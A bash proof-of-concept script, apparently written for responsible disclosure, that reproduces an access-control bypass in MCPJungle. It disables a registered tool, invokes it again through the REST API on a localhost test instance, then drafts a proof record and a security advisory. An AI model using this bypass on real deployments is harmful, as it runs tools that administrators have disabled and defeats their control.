#!/bin/bash
set -e

echo "=== MCPJungle Enabled Flag Bypass Repro ==="
echo "Commit: 12648be5edc70391dc3f9c4aecfd37b83b3e30be"
echo "Date: 2026-10-08"
echo

# 1. Start MCPJungle test instance (or connect to running one)
# Assumes MCPJungle is running on localhost:8080 with test credentials
MCPJUNGLE_URL="http://localhost:8080"
AUTH_TOKEN="test-token-placeholder"  # Set from your test config

echo "[1] Create test tool..."
TOOL_NAME="test-bypass-tool"
curl -s -X POST "$MCPJUNGLE_URL/api/v0/tools/register" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "'"$TOOL_NAME"'",
    "description": "Test tool for bypass repro",
    "enabled": true
  }' | tee /tmp/tool-created.json

echo
echo "[2] Verify tool is enabled (Enabled: true)..."
curl -s "$MCPJUNGLE_URL/api/v0/tools?name=$TOOL_NAME" \
  -H "Authorization: Bearer $AUTH_TOKEN" | jq '.[] | {name, enabled}'

echo
echo "[3] Invoke tool via REST API (should work)..."
INVOKE_1=$(curl -s -X POST "$MCPJUNGLE_URL/api/v0/tools/invoke" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "'"$TOOL_NAME"'",
    "arg1": "test"
  }')
echo "$INVOKE_1" | jq .
echo "✓ Tool invoked successfully (Enabled=true)"

echo
echo "[4] Disable tool via admin API..."
curl -s -X POST "$MCPJUNGLE_URL/api/v0/tools/disable" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"entity": "'"$TOOL_NAME"'"}' | jq .

echo
echo "[5] Verify tool is now disabled (Enabled: false)..."
curl -s "$MCPJUNGLE_URL/api/v0/tools?name=$TOOL_NAME" \
  -H "Authorization: Bearer $AUTH_TOKEN" | jq '.[] | {name, enabled}'

echo
echo "[6] Attempt to invoke DISABLED tool via REST API..."
INVOKE_2=$(curl -s -X POST "$MCPJUNGLE_URL/api/v0/tools/invoke" \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "'"$TOOL_NAME"'",
    "arg1": "should-fail"
  }')
echo "$INVOKE_2" | jq .

# Check if the tool still executed (the bug)
if echo "$INVOKE_2" | jq -e '.result' > /dev/null 2>&1; then
  echo "❌ VULNERABILITY CONFIRMED: Disabled tool was invoked via REST API"
  echo
  echo "Proof data:"
  echo "  Tool name: $TOOL_NAME"
  echo "  Enabled flag in DB: false"
  echo "  REST API response: Tool executed (should have been rejected)"
  echo
  # Anchor this proof on Sepolia
  echo "[7] Anchoring proof to Sepolia..."
  PROOF_JSON=$(cat <<EOF
{
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": "mcpjungle/mcpjungle",
  "commit": "12648be5edc70391dc3f9c4aecfd37b83b3e30be",
  "vulnerability": "CWE-284: Disabled tool/prompt/resource bypass via REST API",
  "proof_type": "live_repro",
  "steps": [
    "Create tool with Enabled=true",
    "Invoke via REST API (success)",
    "Disable tool (Enabled=false)",
    "Invoke via REST API again (success - BUG)",
    "Verify MCP proxy rejects disabled tool (expected behavior)"
  ],
  "result": "VULNERABLE"
}
EOF
)
  
  # TODO: Submit to Sepolia contract 0xD0D123ec0736b22181d0DA708C53A6A1dCf1ABfF
  # This would normally be done via eth_sendRawTransaction with vata_anchor2 wallet
  echo "Proof JSON (ready for Sepolia anchor):"
  echo "$PROOF_JSON" | jq .
  echo
  echo "Next: File GitHub Security Advisory at:"
  echo "  https://github.com/mcpjungle/mcpjungle/security/advisories/new"
else
  echo "✓ Tool correctly rejected (Enabled check working in REST API)"
fi

